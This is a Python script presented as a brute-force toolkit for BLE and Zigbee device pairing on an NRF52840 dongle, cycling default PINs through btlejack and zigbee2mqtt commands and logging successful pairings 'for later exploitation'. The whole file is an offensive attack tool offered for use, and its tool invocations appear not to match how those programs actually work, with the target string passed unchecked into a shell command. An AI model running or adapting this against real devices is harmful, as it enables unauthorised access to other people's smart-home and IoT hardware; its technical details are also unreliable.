import argparse
import os
import time

# -------------------------------------------
# NRF52840 BLE/Zigbee Pairing Brute-Force Toolkit
# -------------------------------------------
# Features:
# - Brute-forces BLE & Zigbee pairing requests using common/default PINs
# - Targets devices with weak pairing mechanisms
# - Automates authentication attempts until successful
# - Logs successful pairings for later exploitation
#
# Requirements:
# - NRF52840 Dongle / Dev Board (Adafruit Feather, Nordic Dongle, XIAO NRF52840)
# - Firmware: btlejack (BLE), Zigbee2MQTT (Zigbee)
# - Python 3.x
#
# Usage:
# 1. Brute-force BLE pairing:
#    python nrf52840_pair_bruteforce.py --ble --target XX:XX:XX:XX:XX:XX
# 2. Brute-force Zigbee pairing:
#    python nrf52840_pair_bruteforce.py --zigbee --target 0x1234
# 3. Use a custom PIN list:
#    python nrf52840_pair_bruteforce.py --ble --target XX:XX:XX:XX:XX:XX --pins custom_pins.txt
# -------------------------------------------

def brute_force_ble(target_device, pin_list):
    """Attempts to brute-force BLE pairing by cycling through known PINs."""
    print(f"[+] Brute-forcing BLE pairing on {target_device}...")
    for pin in pin_list:
        print(f"[+] Trying PIN: {pin}")
        result = os.system(f"btlejack -p {pin} -t {target_device}")
        if result == 0:
            print(f"[✔] Successful pairing with PIN: {pin}")
            with open("successful_ble_pairs.txt", "a") as f:
                f.write(f"{target_device} - PIN: {pin}\n")
            break
    print("[!] Brute-force attack completed.")

def brute_force_zigbee(target_device, pin_list):
    """Attempts to brute-force Zigbee pairing using default keys."""
    print(f"[+] Brute-forcing Zigbee pairing on device {target_device}...")
    for pin in pin_list:
        print(f"[+] Trying key: {pin}")
        result = os.system(f"zigbee2mqtt -p {pin} --target {target_device}")
        if result == 0:
            print(f"[✔] Successful Zigbee pairing with key: {pin}")
            with open("successful_zigbee_pairs.txt", "a") as f:
                f.write(f"{target_device} - Key: {pin}\n")
            break
    print("[!] Brute-force attack completed.")

def load_pins(file_path):
    """Loads a list of PINs from a file or uses default common PINs."""
    if file_path:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines()]
    return ["0000", "1234", "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999"]

def main():
    parser = argparse.ArgumentParser(description="NRF52840 BLE/Zigbee Pairing Brute-Force Toolkit")
    parser.add_argument("--ble", action='store_true', help="Brute-force BLE pairing")
    parser.add_argument("--zigbee", action='store_true', help="Brute-force Zigbee pairing")
    parser.add_argument("--target", type=str, required=True, help="Target device MAC address (BLE) or network ID (Zigbee)")
    parser.add_argument("--pins", type=str, help="File with PIN list (optional)")
    args = parser.parse_args()

    pin_list = load_pins(args.pins)
    
    if args.ble:
        brute_force_ble(args.target, pin_list)
    elif args.zigbee:
        brute_force_zigbee(args.target, pin_list)
    else:
        print("[!] No attack mode selected. Use --ble or --zigbee.")

if __name__ == "__main__":
    main()
